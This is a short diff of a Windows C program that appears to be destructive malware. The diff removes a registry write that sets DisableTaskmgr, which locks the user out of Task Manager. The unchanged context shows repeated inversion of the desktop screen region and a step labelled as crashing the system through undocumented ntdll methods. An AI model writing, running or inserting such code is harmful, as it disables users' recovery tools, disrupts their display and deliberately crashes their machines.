@@ -106,12 +106,6 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
 
     DWORD dwVal = 1;
 
-    HKEY hKey;
-
-    RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
-    RegSetValueEx(hKey, L"DisableTaskmgr", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
-    RegCloseKey(hKey);
-
     Sleep(10000);
 
     DWORD dwID2 = 0;
@@ -238,8 +232,6 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         Sleep(rand() % 1234);
     }
 
-
-
     HRGN hRegion;
 
     hRegion = CreateRectRgn(0, 0, w, h);
@@ -250,8 +242,6 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         InvertRgn(desk, hRegion);
         Sleep(50);
     }
-
-
 
     if (hNtdll != 0) { //crash system using undocumented methods
         NTSTATUS s1, s2;
